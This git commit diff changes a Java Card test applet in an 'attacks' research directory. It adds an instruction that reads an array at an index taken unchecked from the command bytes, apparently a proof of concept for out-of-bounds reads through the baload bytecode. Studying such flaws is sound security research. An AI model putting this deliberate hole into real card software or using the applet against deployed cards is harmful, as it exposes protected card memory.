d23e1b1dc41295743ff3a454ec8248bba9e998be
quapka <quapka@gmail.com>
2020-02-14 22:18:15 +0100

    Add altered source baload

--- attacks/security-explorations/oracle/baload/src/com/InsBaload/InsBaload.java
+++ attacks/security-explorations/oracle/baload/src/com/InsBaload/InsBaload.java
@@ -3,32 +3,48 @@ package com.baload;
 import javacard.framework.*;
 
 public class InsBaload extends Applet {
-    private static final byte INS_SUCCESS = 0x01;
-    private static final byte INS_FAILURE = 0x02;
+  private static final byte INS_SUCCESS = (byte) 0x01;
+  private static final byte INS_FAILURE = (byte) 0x02;
 
-    byte[] success = {(byte) 0x01, (byte) 0x02, (byte) 0x01, (byte) 0x02};
-    byte[] failure = {(byte) 0x80, (byte) 0x40, (byte) 0x80, (byte) 0x40};
-    short msgLen = 4;
+  private static final byte INS_READ = (byte) 0x04;
 
-    public static void install(byte[] array, short off, byte len) {
-        new InsBaload().register();
-    }
-    public void process(APDU apdu) {
-        if (selectingApplet()) { return; }
+  byte[] success = {(byte) 0x01, (byte) 0x02, (byte) 0x01, (byte) 0x02};
+  byte[] failure = {(byte) 0x80, (byte) 0x40, (byte) 0x80, (byte) 0x40};
+  byte[] NOP = {};
+  short msgLen = 4;
 
-        byte[] buf = apdu.getBuffer();
-        switch (buf[ISO7816.OFFSET_INS]) {
-            case INS_SUCCESS:
-                Util.arrayCopyNonAtomic(success, (short) 0, buf, (short) 0, msgLen);
-                apdu.setOutgoingAndSend((short) 0, (short) 4);
-                break;
-            case INS_FAILURE:
-                Util.arrayCopyNonAtomic(failure, (short) 0, buf, (short) 0, msgLen);
-                apdu.setOutgoingAndSend((short) 0, (short) 4);
-                break;
-            default:
-                ISOException.throwIt(ISO7816.SW_INS_NOT_SUPPORTED);
-        }
+  byte[] array = new byte[1];
+
+  public static void install(byte[] array, short off, byte len) {
+    new InsBaload().register();
+  }
+
+  public void process(APDU apdu) {
+    short value;
+    if (selectingApplet()) {
+      return;
     }
 
+    byte[] buf = apdu.getBuffer();
+    switch (buf[ISO7816.OFFSET_INS]) {
+      case INS_SUCCESS:
+        Util.arrayCopyNonAtomic(success, (short) 0, buf, (short) 0, msgLen);
+        apdu.setOutgoingAndSend((short) 0, (short) 4);
+        break;
+      case INS_FAILURE:
+        Util.arrayCopyNonAtomic(failure, (short) 0, buf, (short) 0, msgLen);
+        apdu.setOutgoingAndSend((short) 0, (short) 4);
+        break;
+      case INS_READ:
+        value = Util.getShort(buf, ISO7816.OFFSET_P1);
+        success[0] = 1;
+        success[0] = success[value];
+        // Util.setShort(buf, (short) (0), value);
+        Util.arrayCopyNonAtomic(success, (short) 0, buf, (short) 0, msgLen);
+        apdu.setOutgoingAndSend((short) 0, (short) 2);
+        break;
+      default:
+        ISOException.throwIt(ISO7816.SW_INS_NOT_SUPPORTED);
+    }
+  }
 }
